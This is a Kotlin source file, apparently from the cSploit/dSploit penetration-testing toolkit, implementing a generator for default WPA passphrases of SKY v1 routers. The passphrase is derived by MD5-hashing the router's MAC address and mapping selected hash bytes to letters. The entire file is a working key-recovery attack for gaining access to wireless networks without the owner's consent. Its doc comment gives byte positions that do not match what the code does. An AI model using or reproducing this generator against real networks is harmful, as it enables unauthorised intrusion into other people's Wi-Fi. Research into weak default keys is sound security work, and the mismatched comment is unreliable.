/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.strix.data.wifi.algorithms

import org.csploit.strix.data.wifi.Keygen
import java.security.MessageDigest

/**
 * SKY v1 WPA passphrase algorithm.
 *
 * MD5(mac) -> take bytes at positions 3,7,11,15,19,23,27,31 (odd indices),
 * mod 26 each, map to ALPHABET.
 */
class SkyV1Keygen(
    ssid: String, mac: String, level: Int, enc: String
) : Keygen(ssid, mac, level, enc) {

    override fun getKeys(): List<String>? {
        if (this.mac.length != 12) {
            errorMessage = "This key cannot be generated without MAC address."
            return null
        }
        val md: MessageDigest = try {
            MessageDigest.getInstance("MD5")
        } catch (e: Exception) {
            errorMessage = "This phone cannot process a MD5 hash."
            return null
        }
        md.reset()
        md.update(this.mac.toByteArray())
        val hash = md.digest()
        val key = StringBuilder()
        var i = 1
        while (i <= 15) {
            val index = (hash[i].toInt() and 0xFF) % 26
            key.append(ALPHABET[index])
            i += 2
        }
        addPassword(key.toString())
        return getResults()
    }

    companion object {
        private const val ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    }
}
